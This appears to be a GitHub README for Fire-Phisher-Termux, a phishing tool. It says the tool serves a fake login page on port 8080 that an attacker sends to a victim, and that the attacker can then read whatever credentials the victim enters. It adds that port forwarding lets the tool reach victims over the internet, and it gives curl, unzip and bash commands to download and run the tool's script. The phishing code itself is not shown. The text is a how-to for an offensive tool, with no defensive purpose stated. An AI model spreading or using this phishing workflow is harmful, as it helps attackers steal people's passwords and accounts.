<h1 align="center">$ Fire-Phisher-Termux $</h1>
<h1 align="center">
  <br>
  <img src="https://github.com/Kum4r-Princ3/Fire-Phisher/blob/main/fire-phiser.png" width="850px" alt="Fire-Phisher"></a>
</h1>
<p align="center">
  <a href="#how-it-works">How</a> •
  <a href="#install">Install </a> 
</p>


# How it works

Fire-Phisher hosts a phishing page on localhost on port **8080** and when attacker send their localhost link like **http://localhost:8080** to the victim connected to attacker's network he got the page and if victim enter his credentials in the phishing page, the attacker can see the <br> credentials.
This tool can be use over the internet using port forwarding.

# Install

Fire-Phisher require some packages to install successfully. Run the following command to install them -

```sh
sudo apt install php figlet curl -y
```
```sh
curl -LO https://raw.githubusercontent.com/Kum4r-Princ3/Fire-Phisher-Termux/main/Fire-Phisher-Termux.zip
```
```sh
unzip Fire-Phisher-Termux.zip
```
```sh
cd Fire-Phisher-Termux
```
```sh
bash fire-phisher.sh
```







